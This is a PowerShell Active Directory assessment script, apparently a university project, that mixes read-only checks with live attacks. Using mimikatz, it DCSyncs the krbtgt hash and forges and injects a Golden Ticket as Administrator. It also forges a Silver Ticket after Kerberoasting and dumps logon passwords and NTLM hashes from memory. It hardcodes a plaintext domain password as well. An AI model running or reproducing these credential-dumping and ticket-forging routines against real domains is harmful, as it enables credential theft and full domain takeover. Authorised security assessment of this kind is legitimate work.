<#
                    This tool was written by Mahmood Al-Shukri
            A part of my MSc studies at the Univerisity of Bedfordshire
             Microsoft Active Directory Robotic Assessment Tool (MAD-RAT) 

#>
$version="v2.3.4"

$host.ui.RawUI.WindowTitle = “MAD-RAT”
Clear-Host
$currenttime=get-date -Format hhmmss
$logfile= ".\logfile-$currenttime.txt"
Start-Transcript -Path $logfile

#____________________________________________________________________________________________________________________________#
#                                                  Welcome Definitions
function WelcomeFunction {
Write-Host "-------------------------------------------------------------------------------------------------------------`n"
Write-Host @"
`t _______  _______  ______          _______  _______ _________
`t(       )(  ___  )(  __  \        (  ____ )(  ___  )\__   __/
`t| () () || (   ) || (  \  )       | (    )|| (   ) |   ) (   
`t| || || || (___) || |   ) | _____ | (____)|| (___) |   | |   
`t| |(_)| ||  ___  || |   | |(_____)|     __)|  ___  |   | |   
`t| |   | || (   ) || |   ) |       | (\ (   | (   ) |   | |   
`t| )   ( || )   ( || (__/  )       | ) \ \__| )   ( |   | |   
`t|/     \||/     \|(______/        |/   \__/|/     \|   )_(  $version

"@
Write-Host "`tMicrosoft Active Directory Robotic Assessment Tool`n"
Write-Host "`tWritten by     M a h m o o d   A l - S h u k r i `n`n"
Write-Host "Disclaimer: Please Use This tool under your responsibility, no warranty provided with this tool" -ForegroundColor Yellow -BackgroundColor Black
Write-Host "-------------------------------------------------------------------------------------------------------------`n"
} # End of WelcomeFunction

#____________________________________________________________________________________________________________________________#
#                                           Preparing the Environment 
function PrepareEnvironment 
{
    if (-not(Get-PSRepository -Name mad-rat-repo)) {
     Register-PSRepository -Name 'mad-rat-repo' -SourceLocation $PSScriptRoot }
    $functionStatus=$false
    write-host "[i] Prepare Environment Function..."
    Write-Host "[i] Running script under user: $env:UserName"
    Write-Host "[i] Checking 'output' folder in $PSScriptRoot"
    if (-not(Test-Path "$PSScriptRoot\output"))
    {
        Write-Host "[i] 'output' folder doesn't exist.. now creating it"
        try {New-Item "$PSScriptRoot\output" -ItemType Directory | Out-Null
        $functionStatus=$true 
    } 
                catch {Write-Host "[E-A1] Cannot create output folder" -ForegroundColor Red
                $functionStatus=$false
            } 
    }
    Write-Host "[i] output files will be in $PSScriptRoot\output"
    Write-Host "[i] Checking the prerequisites... "
    Write-Host "[i] Checking Active Directory Module.."
    if(-not( get-module -list activedirectory))
    {
        Write-host "[i] Looking For ./rsat.msu.."
        Write-Host "[W] Make sure you run PowerShell as Administrator" -ForegroundColor Yellow
        $installrsat = wusa.exe rsat.msu /quiet /norestart
        Write-host "[i] Trying to install rsat.msu"
        try{
            Wait-Process -InputObject $installrsat
            $functionStatus=$true
        }
        catch{
            Write-Host "[E-A2] Cannot Install Active Directory Module" -ForegroundColor Red
            $functionStatus=$false
        }
    }
    else
    {Write-Host "[i] Active Directory Module Seems to be OK"
    $functionStatus=$true
    }
    

    if(-not( get-module -list ImportExcel))
    {
     $moduleExcel=install-module ImportExcel -Repository 'mad-rat-repo' -confirm
        try{
            Wait-Process -InputObject $moduleExcel
            $functionStatus=$true
        } 
        catch{
            Write-Host "[E-A3] Cannot install ImportExcel Module" -ForegroundColor Red
            $functionStatus=$false
        }
    }
    else 
    {
        Write-host "[i] Done Installing ModuleExcel"
        $functionStatus=$true
    }
   
  if(-not( get-module -list DSinternals)){
    $dsinternalsmodule=install-module -Repository 'mad-rat-repo' DSinternals -confirm
    try{
    Wait-Process -InputObject $dsinternalsmodule
    Write-host "[i] Done Installing DSinternals"
    }catch{
    Write-Host "[E-A4] Cannot install DSinternals Module" -ForegroundColor Red
    }
 }  
 if (-not (Test-Path $PSScriptRoot\mimikatz\x64\mimikatz.exe)){
    Write-Host "[E-A5] Mimikatz is needed for this script and should be located in $PSScriptRoot\mimikatz\x64\" -ForegroundColor Red
 }
  Write-Host "[i] Starting the Active Directory Assessment..." -ForegroundColor DarkGreen
return $functionStatus
}






<#____________________________________________________________________________________________________________________________
                                                 Function Definitions
                       Eeach test was put in a seperate function and called in the main function.
____________________________________________________________________________________________________________________________
                                    #1 Group Policy Preferences Visible Passwords Function   
____________________________________________________________________________________________________________________________     #>
function CheckGPOvisiblePasswordsFunction 
{
Write-Host "[i] Looking for Group Policy Preferences Visible Passwords" -ForegroundColor Gray  -BackgroundColor Black
$DomainName= (Get-ADForest).Domains| %{Get-ADDomain -Server $_} | Select-Object -ExpandProperty DNSRoot
#create hashtables of extension names that contain CPassword extension property names and friendly Name
	$computerExtensions = @{"LocalUsersAndGroups.User" = "Local Users and Groups";
	"DataSourcesSettings.Datasource" = "Data Sources";
	"NTServices.NTService" = "Services";
	"ScheduledTasks.Task" = "Scheduled Tasks";
	}
	$userExtensions = @{"LocalUsersAndGroups.User" = "Local Users and Groups";
	"DataSourcesSettings.Datasource" = "Data Sources";
	"NTServices.NTService" = "Services";
	"ScheduledTasks.Task" = "Scheduled Tasks";
	"DriveMapSettings.Drive" = "Drive Maps"
	}
	$scheduledTaskTypes = @{"ScheduledTasks.Task" = "Scheduled Tasks";
	"ScheduledTasks.TaskV2" = "Scheduled Tasks (Vista and above)";
	"ScheduledTasks.ImmediateTask" = "Immediate Task (Windows XP)";
	"ScheduledTasks.ImmediateTaskV2" = "Immediate Task (Vista and above)"
	}
	# first, get GPO settings reports of all the GPOs in the selected domain
	if ($DomainName -ne $null)
	{
		$GPOReports = Get-GPOReport -All -ReportType Xml -Domain $DomainName
	}
	else # run against current domain
	{
		$GPOReports = Get-GPOReport -All -ReportType Xml
	}
	# now iterate through all reports (i.e. GPOs) to find CPassword instances
    $report= New-Object XML
	for ($index = 0; $index -lt $GPOReports.Count; $index++) 
	{
		$report = $GPOReports[$index]
		#check computer extensions first
		foreach ($extension in $report.GPO.Computer.ExtensionData)
		{
			foreach ($cExt in $computerExtensions.Keys)
			{
				if ($extension.Name -eq $computerExtensions[$cExt])
				{
					#create the standard command we'll invoke for all extensions
					$command = "`$report.GPO.Computer.ExtensionData.Extension.$cExt.Properties.cPassword"
					#need to handle the special case for Scheduled where there could be multiple types
					if ($extension.Name -eq "Scheduled Tasks")
					{
						foreach ($schedTaskItem in $scheduledTaskTypes.Keys)
						{
							$command = "`$report.GPO.Computer.ExtensionData.Extension.$schedTaskItem.Properties.cPassword"
							if ((Invoke-Expression -Command  $command) -ne $null)
							{
								$obj = New-Object  typename PSObject
    	                		$obj | Add-Member  membertype NoteProperty  name GPOName  value ($report.GPO.Name)  passthru |
	                           			Add-Member  membertype NoteProperty  name Side  value ("Computer")  passthru |
		                       			Add-Member  membertype NoteProperty  name Extension  value ($scheduledTaskTypes[$schedTaskItem])
								$obj  | Format-Table -AutoSize >> "$PSScriptRoot\output\GPO-Pass-$currenttime.csv"
                                    Write-Host "[i] Done searching! see the report in output folder" -ForegroundColor Green
							}
						}
					}
					else
					{
						if ((Invoke-Expression -Command  $command) -ne $null)
						{
							#Now create a new custom object containing the GPO Name, GPO side (computer or user) and extension where we found the password
							$obj = New-Object  typename PSObject
	    	                $obj | Add-Member  membertype NoteProperty  name GPOName  value ($report.GPO.Name)  passthru |
		                           Add-Member  membertype NoteProperty  name Side  value ("Computer")  passthru |
			                       Add-Member  membertype NoteProperty  name Extension  value ($extension.Name)
							$obj  | Format-Table -AutoSize >> "$PSScriptRoot\output\GPO-Pass-$currenttime.csv"
                                    Write-Host "[i] Done searching! see the report in output folder" -ForegroundColor Green
                                    Write-Host "Recommendation: read this article by Microsoft: https://support.microsoft.com/en-gb/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30" -ForegroundColor White -BackgroundColor Black
						}
					}
				}
			}
		}
		#now check user extensions
		foreach ($extension in $report.GPO.User.ExtensionData)
		{
			foreach ($cExt in $userExtensions.Keys)
			{
				if ($extension.Name -eq $userExtensions[$cExt])
				{
					#create the standard command we'll invoke for all extensions
					$command = "`$report.GPO.User.ExtensionData.Extension.$cExt.Properties.cPassword"
					#need to handle the special case for Scheduled where there could be multiple types
					if ($extension.Name -eq "Scheduled Tasks")
					{
						foreach ($schedTaskItem in $scheduledTaskTypes.Keys)
						{
							$command = "`$report.GPO.User.ExtensionData.Extension.$schedTaskItem.Properties.cPassword"
							if ((Invoke-Expression -Command  $command) -ne $null)
							{
								$obj = New-Object  typename PSObject
    	                		$obj | Add-Member  membertype NoteProperty  name GPOName  value ($report.GPO.Name)  passthru |
	                           			Add-Member  membertype NoteProperty  name Side  value ("User")  passthru |
		                       			Add-Member  membertype NoteProperty  name Extension  value ($scheduledTaskTypes[$schedTaskItem])
								$obj  | Format-Table -AutoSize >> "$PSScriptRoot\output\GPO-Pass-$currenttime.csv"
                                    Write-Host "[i] Done searching! see the report in output folder" -ForegroundColor Green
                                    Write-Host "Recommendation: read this article by Microsoft: https://support.microsoft.com/en-gb/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30" -ForegroundColor White -BackgroundColor Black
							}
						}
					}
					else
					{
						if ((Invoke-Expression -Command  $command) -ne $null)
						{
							#Now create a new custom object containing the GPO Name, GPO side (computer or user) and extension where we found the password
							$obj = New-Object  typename PSObject
	    	                $obj | Add-Member  membertype NoteProperty  name GPOName  value ($report.GPO.Name)  passthru |
		                           Add-Member  membertype NoteProperty  name Side  value ("User")  passthru |
			                       Add-Member  membertype NoteProperty  name Extension  value ($extension.Name)
							        $obj  | Format-Table -AutoSize >> "$PSScriptRoot\output\GPO-Pass-$currenttime.csv"
                                    Write-Host "[i] Done searching! see the report in the output folder" -ForegroundColor Green
						}
					}
				}
			}
		}
	}
	if (-not($obj | Measure-Object  -Property Count)){
        Write-Host "[i] No Passwords were found! "
}
#return $true
}
# End of  CheckGPOvisiblePasswordsFunction



<#____________________________________________________________________________________________________________________________
                                    #2 Checking Hidden Security Identifier (SID) Function                                  #>
function CheckHiddenSIDFunction {
Write-Host "[i] Starting CheckHiddenSIDFunction" -ForegroundColor Gray -BackgroundColor Black
Write-Host "[i] Getting SID history Attributes..."
    try{
    Write-Host "[i] Searching ..."
    Get-ADUser -filter {samaccountname -like "admin*"} -Properties SidHistory | Select-Object -ExpandProperty SIDHistory
    Write-Host "[i] Done!"
    Write-Host "Recommendations: Read Microsoft Article https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-unsecure-sid-history-attribute#what-is-an-unsecure-sid-history-attribute" -ForegroundColor White -BackgroundColor Black
       }catch{
        Write-Host "[E-B1] Couldn't get the Hidden SID!" -ForegroundColor red 
       }

}

<#____________________________________________________________________________________________________________________________
                                    #3         Checking Silver Ticket Function                                          #>
function CheckSilverTicketFunction {
Write-Host "[i] Starting CheckSilverTicketFunction" -ForegroundColor Gray -BackgroundColor Black
try{
$DomainInfo= (Get-ADForest).Domains| %{Get-ADDomain -Server $_} | Select DNSRoot,Name,DomainSID,Forest,InfrastructureMaster
$DomainName= $DomainInfo.DNSROOT
$DomainShortName= $DomainInfo.Name
$DomainSID= $DomainInfo.DomainSID
$DomainDC= $DomainInfo.InfrastructureMaster
$usersiddd=Get-aduser sql | select sid | ft -HideTableHeaders|out-string
$usersidd=$usersiddd.trim()
$usersid=$usersidd -replace (' ','')
$userid=$usersid.split("-")[-1]
$ServiceSPN="CIFService"
$ServiceType="CIFS"
Write-host "[i] Current Domain: $DomainName`n[i] Current Domain SID: $DomainSID`n[i] Current DC: $DomainDC"
Write-host "[i] User SID: $usersid `n[i]User ID: $userid"
}
catch{ Write-Host "[E-C1] Cannot Run Get-ADForest Command. Do you have enough privileges?"}
Write-host "[i] Trying to Get Silver Ticket"
Write-host "[i] Looking for SPN.."
Get-ADUSer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName 
Write-host "[i] Getting the ticket to memory.."
#Source: https://blog.netwrix.com/2022/08/31/extracting-service-account-passwords-with-kerberoasting/
try{
Add-Type  AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken  ArgumentList  $ServiceType/$DomainDC 
}catch{Write-host "[E-C2] Error in Getting the Ticket to the memory" -ForegroundColor Red}
Write-host "[i] Exporting the ticket to a file..."
Write-host "[i] Crack the ticket in this folder ("(Get-Location)")then insert the password below or skip this test" -ForegroundColor Cyan
$Password= Read-Host("Insert the password cracket here:")
Write-host "[i] converting the password to NTLM Hash.."
try{
$pwd=ConvertTo-SecureString $Password -AsPlainText -Force
$PasswordNTHash= ConvertTo-NTHash $pwd
Write-host ("[i] The password NT hash is $PasswordNTHash")
}catch{Write-host "[E-C3] Cannot covert to NTLM Hash" -ForegroundColor Red}
Write-Host "[i] Getting the Silver Ticket"
try{
if (-not (Test-Path $PSScriptRoot\mimikatz\x64\mimikatz.exe)){
    Write-Host "[E-C4] Mimikatz is needed for this script and should be located in $PSScriptRoot\mimikatz\x64\" -ForegroundColor Red
 }
.\mimikatz\x64\mimikatz.exe "kerberos::golden /sid:$usersid /domain:$DomainName /ptt /id:$userid /target:$DomainDC /service:$ServiceType /rc4:$PasswordNTHash /user:$ServiceSPN" exit
Write-host "[i] The Silver Ticket was obtained" -ForegroundColor Green
Write-Host "Recommendations: Read Microsoft Article https://learn.microsoft.com/en-us/defender-for-identity/persistence-privilege-escalation-alerts" -ForegroundColor White -BackgroundColor Black
}catch{Write-Host "[E-C5] Something went wrong.. Cannot get the silver ticket or the target is not vulnerable" -ForegroundColor Red}

#return $true   
}
<#____________________________________________________________________________________________________________________________
                                    #4         Checking Golden Ticket Function                                           #>
function CheckGoldenTicketFunction {
Write-Host "[i] Starting CheckGoldenTicketFunction" -ForegroundColor Gray -BackgroundColor Black

try{
$DomainInfo= (Get-ADForest).Domains| %{Get-ADDomain -Server $_} | Select DNSRoot,Name,DomainSID,Forest,InfrastructureMaster
$DomainName= $DomainInfo.DNSROOT
$DomainShortName= $DomainInfo.Name
$DomainSID= $DomainInfo.DomainSID
$DomainDC= $DomainInfo.InfrastructureMaster
Write-host "[i] Current Domain is $DomainName`n[i] Current Domain SID is $DomainSID`n[i] Current DC is: $DomainDC"
}
catch{ Write-Host "[E-D1] Cannot Run Get-ADForest Command. Do you have enough Privilleges?" -ForegroundColor Red}
Write-host "[i] Trying to Get Golden Ticket"

#### Getting Krbtgt NTLM Hash
try{
Write-Host "[i] Getting Krbtgt NTLM Hash"
$data = (.\mimikatz\x64\mimikatz.exe "lsadump::dcsync /user:alshukri\Krbtgt" exit)
$hash = (echo $data| sls "Hash NTLM")
$krbtgthash= $hash.ToString().Substring(13)
$sid=(echo $data| sls "Object Security ID   : ").ToString().Substring(23)
$domainsid=$sid.Trim("-502")

}catch{Write-Host "[E-D2] Cannot Run dump krbtgt hash. Do you have enough Privilleges?" -ForegroundColor Red}

Try{
.\mimikatz\x64\mimikatz.exe "kerberos::golden /User:Administrator /domain:$DomainName /sid:$sid /krbtgt:$krbtgthash /id:500 /groups:512 /ptt" "kerberos::tgt" exit
Write-Host "[i] Getting Golden Ticket is Successful, now the attacker can be a Domain Admin!!" -ForegroundColor Green
Write-Host "Recommendations: Read Microsoft Article https://learn.microsoft.com/en-us/defender-for-identity/persistence-privilege-escalation-alerts" -ForegroundColor White -BackgroundColor Black
}catch{
Write-host "[E-D3] cannot get the Golden Ticket an Error happened!" -ForegroundColor Red
}


#return $true    
}
<#____________________________________________________________________________________________________________________________
                                    #5       Checkin Domain Replication Backdoor Function                                  #>
function CheckDomainReplicationBackdoorFunction {
    Write-Host "[i] Starting CheckDomainReplicationBackdoorFunction" -ForegroundColor Gray -BackgroundColor Black
    Write-Host "[i] Getting top users can sync data out of DC..."
    $adgroups = "Administrators","DomainAdmins","EnterpriseAdmins","Domain Admins"

$results = @();

foreach ($group in $adgroups) 

{
  Try{ $results+= (Get-ADGroupMember -Identity $group -Recursive)}
  catch {write-host "[W-E1] $group not found" -ForegroundColor Yellow}

}

$results | Format-Table -AutoSize >> "$PSScriptRoot\output\DC-Sync-users-$currenttime.csv"
Write-Host "[i] Done! output found in $PSScriptRoot\output\DC-Sync-users-$currenttime.csv" -ForegroundColor Green
Write-Host "Recommendations: Read Artice: https://attack.mitre.org/techniques/T1003/006/" -ForegroundColor White -BackgroundColor Black    
    #return $true
}
<#____________________________________________________________________________________________________________________________
                                    #6 Checking Unprivileged Admin Holder ACL Function                                  #>
function CheckUnprivilegedAdminHolderFunction {
    $DomainBase=(Get-ADForest).Domains| %{Get-ADDomain -Server $_} | Select-Object -ExpandProperty DistinguishedName
    Write-Host "[i] CheckUnprivilegedAdminHolderFunction" -ForegroundColor Gray -BackgroundColor Black
    Write-Host "[i] Getting Users' Critical Permissions hackers can use for privilege escalation..."
    & "$PSScriptRoot\ADACLScan.ps1" -Base $DomainBase -permission "WriteProperty | GenericAll | ExtendedRight" -output EXCEL -outputFolder "$PSscriptRoot\output"
    Write-Host "Recommendation: Read Microsoft Article: https://social.technet.microsoft.com/wiki/contents/articles/22331.adminsdholder-protected-groups-and-security-descriptor-propagator.aspx" -ForegroundColor White -BackgroundColor Black

   
}
<#____________________________________________________________________________________________________________________________
                                    #7 Checking Power User Enumeration Function                                  #>
function EnumeratePowerUserFunction {
    Write-Host "[i] Starting EnumeratePowerUserFunction" -ForegroundColor Gray -BackgroundColor Black
    Write-Host "[i] Getting Users With Password Never Expires..."
try {
        get-aduser -filter * -properties Name, PasswordNeverExpires | where { $_.passwordNeverExpires -eq "true" } | where {$_.enabled -eq "true"} | Format-Table -Property  SamAccountName,PasswordNeverExpires,UserprincipalName -AutoSize
} 
catch {
Write-host "[E-G1] Failed to Get Never expire passwords" -ForegroundColor Red}
    
}
<#____________________________________________________________________________________________________________________________
                                    #8 Checking Anonymous LDAP Allowed Function                                  #>
function CheckAnonymousLDAPAccessFunction {
    Write-Host "[i] Starting CheckAnonymousLDAPAccessFunction" -ForegroundColor Gray -BackgroundColor Black
    $DomainDN=(Get-ADDomain).DistinguishedName
$TargetDN=("CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$DomainDN")
Write-host ("[i] Checking configuration if the Anonymous Access to Domain is enabled")
$ValuedsHeuristics = (Get-ADObject -Identity $TargetDN -Properties dsHeuristics).dsHeuristics
echo $ValuedsHeuristics
if(($ValuedsHeuristics -eq "") -or ($ValuedsHeuristics.Length -lt 7)){
    
    Write-host "[i] The Anonymos Access id Disabled in this Domain" -ForegroundColor Green

}elseif(($ValuedsHeuristics.Length -ge 7) -and ($ValuedsHeuristics[6] -eq "2")){

    Write-host "[W] The Anonymos Access id Enabled in this Domain " -ForegroundColor Yellow
    Write-host "Recommendation: Read this article https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/understanding-ldap-security-processing/ba-p/397087" -ForegroundColor White -BackgroundColor Black
    }
}
<#____________________________________________________________________________________________________________________________
                                    #9 Checking if DSRM Login Enabled Function                                  #>
function CheckDSRMLoginEnabledFunction {
    Write-Host "[i] Starting CheckDSRMLoginEnabledFunction" -ForegroundColor Gray -BackgroundColor Black
    $domaindc= (Get-ADDomain).PDCEmulator
    $pass= ConvertTo-SecureString "M@hmo0oD" -AsPlainText -Force
    $user= "alshukri\2112747"
    $creds= [PSCredential]::new($user, $pass)
Try{
if ($dsrmvalue=(Invoke-Command -Computer $domaindc -Credential $creds  -ScriptBlock {Get-ItemProperty -Path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name DsrmAdminLogonBehavior -ErrorAction Ignore}).DsrmAdminLogonBehavior){
    if($dsrmvalue -eq 0){Write-host ("[i] The DSRM password can be used only through Safe Mode")}
    elseif($dsrmvalue -eq 1){Write-host ("[i] The DSRM password can be used when the AD DS is disabled")}
    elseif($dsrmvalue -eq 2){Write-host "[W] The DSRM password is set to 2, which means any time DC local Administrator can logon to DC anytime!" -ForegroundColor Yellow}
 }
 else {Write-host "[i] The DSRM password can be used only through Safe Mode"}

 }
 catch {
 Write-host "[E-H1] Cannot Contact the Domain Controller!" -ForegroundColor Red
 
 }   
 Write-Host "Recommendation: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754363(v=ws.11)" -ForegroundColor White -BackgroundColor Black
}
<#____________________________________________________________________________________________________________________________
                                    #10 Checking Local Admin Traversal Function                                  #>

function CheckLocalAdminTraversalFunction {
    Write-Host "[i] Starting CheckLocalAdminTraversalFunction" -ForegroundColor Gray  -BackgroundColor Black
    $userdumps=@(.\mimikatz\x64\mimikatz.exe "privilege::debug" "log passthehash.log" "sekurlsa::logonpasswords" exit )
$selectedlines=$userdumps | Select-String -Pattern "(.Username.|.NTLM.)"
$withoutusername=$selectedlines -replace('\* Username : ','')
$purlistofusersandntlm=$withoutusername -replace('\* NTLM     : ','')
$thecleanlist=$purlistofusersandntlm -replace ('\(null\)','')
$localusernames=@()
$localntlm=@()
for ($i = 0; $i -lt $thecleanlist.Count; $i += 2) {


    $localusernames += $thecleanlist[$i]
    $localntlm += $thecleanlist[$i + 1]
}
$localusers= $localusernames | Get-Unique |Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
$ntlhashes=@($localntlm | Get-Unique | Where-Object { $_.Length -ge 32 })|Get-Unique

Write-Host ("[i] list of usernames found are: ")
$localusers
Write-Host ("[i] list of NTLM hashes found are:")
$ntlhashes
Write-Host "[w] NTLM hashes can be cracked and attackers can use the password to accesss other machines or`n   by using PassTheHash attack without the need of cracking the password" -ForegroundColor Yellow  
Write-Host "Recommendation: https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts"
}
<#____________________________________________________________________________________________________________________________
                                                  End of Function Defentions                                             #>
#_____________________________________________________________________________________________________________________________#
#                                                     Main Function
WelcomeFunction
if (!(PrepareEnvironment)) {
    Write-Host "[E-M1] Failed to Fulfill the Prerequists to run this script!" -ForegroundColor Red
    exit
} 
CheckGPOvisiblePasswordsFunction;pause
#$function2output=
CheckHiddenSIDFunction;pause
#$function3output=
CheckSilverTicketFunction;pause 
#$function4output=
CheckGoldenTicketFunction;pause 
#$function5output=
CheckDomainReplicationBackdoorFunction;pause
#$function6output=
CheckUnprivilegedAdminHolderFunction;pause
#$function7output=
EnumeratePowerUserFunction;pause
#$function8output=
CheckAnonymousLDAPAccessFunction;pause
#$function9output=
CheckDSRMLoginEnabledFunction;pause
#$function10output=
CheckLocalAdminTraversalFunction;pause


Write-Host "`n`n`t[END] The script is completed!`n" -ForegroundColor Green
Write-Host " `t`t`t`t`t`tT H A N K   Y O U"
Write-Host "----------------------------------------------------------------------------------------------------MAD-RAT---------`n"
Stop-Transcript
Pause
Move-Item $logfile ./output/.
#End